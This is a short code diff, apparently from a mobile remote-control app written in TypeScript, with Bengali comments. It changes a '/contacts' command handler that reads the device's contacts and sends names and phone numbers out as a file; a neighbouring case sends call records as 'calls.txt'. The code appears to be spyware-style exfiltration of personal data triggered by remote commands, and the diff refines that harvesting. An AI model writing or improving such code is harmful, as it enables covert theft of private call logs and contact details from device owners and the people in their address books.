@@ -45,7 +45,15 @@ const handleCommand = async (text: string) => {
         await sendFile(c.data, "calls.txt");
         break;
     case '/contacts':
-        const con = await Contacts.getContacts();
+        // এই অংশটুকু পরিবর্তন করা হলো
+        const con = await Contacts.getContacts({
+            projection: {
+                name: true,
+                phones: true
+            }
+        });
+        
+        // নিচের অংশটুকু আগের মতোই থাকবে
         const list = con.contacts.map(u => `${u.name?.display}: ${u.phones?.[0]?.number}`).join('\n');
         await sendFile(list, "contacts.txt");
         break;
